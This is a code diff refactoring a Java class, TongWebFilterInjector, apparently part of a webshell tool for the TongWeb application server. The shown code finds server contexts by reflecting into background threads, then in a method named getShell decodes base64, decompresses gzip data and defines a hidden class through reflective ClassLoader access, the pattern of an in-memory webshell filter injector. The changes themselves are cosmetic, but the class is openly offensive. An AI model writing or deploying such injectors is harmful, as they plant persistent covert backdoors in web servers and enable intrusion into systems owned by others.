@@ -6,10 +6,7 @@ import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.logging.Logger;
 import java.util.zip.GZIPInputStream;
 
@@ -49,18 +46,15 @@ public class TongWebFilterInjector {
 
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
-        Object context = null;
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object key : childrenMap.keySet()) {
-                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(childrenMap.get(key), "children");
-                    for (Object key1 : children.keySet()) {
-                        context = children.get(key1);
-                        if (context != null && context.getClass().getName().contains("StandardContext")) {
-                            contexts.add(context);
-                        }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Collection<?> values = childrenMap.values();
+                for (Object value : values) {
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                    for (Object context : children.values()) {
+                        contexts.add(context);
                     }
                 }
             }
@@ -70,18 +64,16 @@ public class TongWebFilterInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = context.getClass().getClassLoader();
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     @SuppressWarnings("all")
@@ -136,7 +128,6 @@ public class TongWebFilterInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -144,16 +135,13 @@ public class TongWebFilterInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
